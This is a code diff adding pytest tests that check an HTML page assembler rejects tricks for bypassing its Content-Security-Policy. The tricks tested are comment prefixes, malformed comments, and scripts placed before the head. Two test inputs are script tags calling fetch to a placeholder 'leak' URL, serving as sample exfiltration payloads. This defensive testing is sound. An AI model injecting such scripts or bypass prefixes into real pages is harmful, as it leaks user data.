@@ -50,3 +50,18 @@ def test_safe_page_gets_network_blocking_policy():
     page = assemble_page('<!doctype html><html><head></head><body><button>试试</button></body></html>')
     assert "connect-src 'none'" in html.unescape(page)
     assert 'Content-Security-Policy' in page
+
+
+@pytest.mark.parametrize('prefix',[
+    '<!-- <html><head></head></html> -->',
+    '<script>fetch("https://example.invalid/leak")</script>',
+    '<!-->',
+])
+def test_ambiguous_prefix_cannot_bypass_content_policy(prefix):
+    with pytest.raises(ValueError):
+        assemble_page(prefix+'<html><head></head><body>test</body></html>')
+
+
+def test_executable_content_cannot_precede_head():
+    with pytest.raises(ValueError):
+        assemble_page('<html><script>fetch("https://example.invalid/leak")</script><head></head><body>x</body></html>')
